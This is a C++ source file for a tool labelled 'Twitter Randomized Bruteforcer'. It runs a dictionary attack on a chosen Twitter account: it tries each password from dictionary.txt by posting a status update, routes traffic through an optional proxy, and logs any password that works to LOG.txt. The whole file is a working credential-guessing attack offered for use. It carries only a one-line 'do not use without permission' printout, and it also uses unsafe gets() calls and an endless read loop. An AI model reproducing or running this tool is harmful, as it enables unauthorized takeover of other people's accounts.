#include <iostream>
#include <fstream>
#include <cstdlib>
#include <ctime>
#include "twitcurl.h"

std::ofstream output;

    twitCurl twitterObj;
    std::string tmpStr( "" );
    std::string replyMsg( "" );
    std::string baseString = "";

     void checkPassword(std::string password) {
     
     twitterObj.setTwitterPassword( password );
  
          if( twitterObj.statusUpdate( tmpStr ) )
    {
        twitterObj.getLastWebResponse( replyMsg );
        printf( "\ntwitterClient:: twitCurl::updateStatus web response:\n%s\n", replyMsg.c_str() );
        std::cout << "\nPassword used was: " << password;
        output << "\nWeb Response: \n" << replyMsg.c_str() << "\n";
        output << "Password used was: " << password << "\n"; 
    } 
  
}

int main()
{
    output.open("LOG.txt");

    /* Set twitter username and password */
    char userName[1024];
    //char passWord[1024];
    memset( userName, 0, 1024 );
    //memset( passWord, 0, 1024 );

    printf( "\nTwitter Randomized Bruteforcer by Arikado" );
    printf( "\nhttp://arikadosblog.blogspot.com" );
    printf( "\nhttp://twitter.com/OArikadoO" );
    
    printf ("\n\nDo NOT use this program to get any passwords you do not have permission to get.");

    printf( "\n\nEnter twitter username to dictionary attack: " );
    gets( userName );

    tmpStr = userName;
    twitterObj.setTwitterUsername( tmpStr );
    
    output << "Dictionary Attacking: " << tmpStr << std::endl;
    
    std::string passcheck;

    FILE *fp = NULL;
    fp = fopen("dictionary.txt", "r");

    int placeholder;
    
    //Killing garbage so the first word on the list is read correctly
    placeholder = fgetc(fp);
    placeholder = fgetc(fp);
    placeholder = fgetc(fp);

    /* Set proxy server usename, password, IP and port (if present) */
    char proxyPresent[1024];
    memset( proxyPresent, 0, 1024 );

    printf( "\nDo you have a proxy server configured (0 for no; 1 for yes): " );
    int isProxy = 0;
    std::cin >> isProxy;

    if( isProxy > 0 )
    {
        char proxyIp[1024];
        char proxyPort[1024];
        char proxyUsername[1024];
        char proxyPassword[1024];

        memset( proxyIp, 0, 1024 );
        memset( proxyPort, 0, 1024 );
        memset( proxyUsername, 0, 1024 );
        memset( proxyPassword, 0, 1024 );

        printf( "\nEnter proxy server IP: " );
        gets( proxyIp );//We have to do this twice to beat out a nasty bug which conflicts with std::cin
        gets( proxyIp );
        printf( "\nEnter proxy server port: " );
        gets( proxyPort );
        printf( "\nEnter proxy server username: " );
        gets( proxyUsername );
        printf( "\nEnter proxy server password: " );
        gets( proxyPassword );

        tmpStr = proxyIp;
        twitterObj.setProxyServerIp( tmpStr );
        tmpStr = proxyPort;
        twitterObj.setProxyServerPort( tmpStr );
        tmpStr = proxyUsername;
        twitterObj.setProxyUserName( tmpStr );
        tmpStr = proxyPassword;
        twitterObj.setProxyPassword( tmpStr );
    }

    /* Post a new status message */
    char statusMsg[1024];
    memset( statusMsg, 0, 1024 );

    printf( "\nEnter a new status message: " );
    if(isProxy <= 0)
    gets( statusMsg );
    gets( statusMsg );
    tmpStr = statusMsg;
    
    for(;;){

            passcheck = "";

            while(true){

                       //Read characters one by one
                       placeholder = fgetc(fp);

                       //If a newline is reached, check the current password formed
                       if(placeholder == '\n')
                       break;

                       else
                       passcheck += placeholder;

            }

            checkPassword(passcheck);

    }

    fclose(fp);                            
 
    output.close();

    return 0;
}
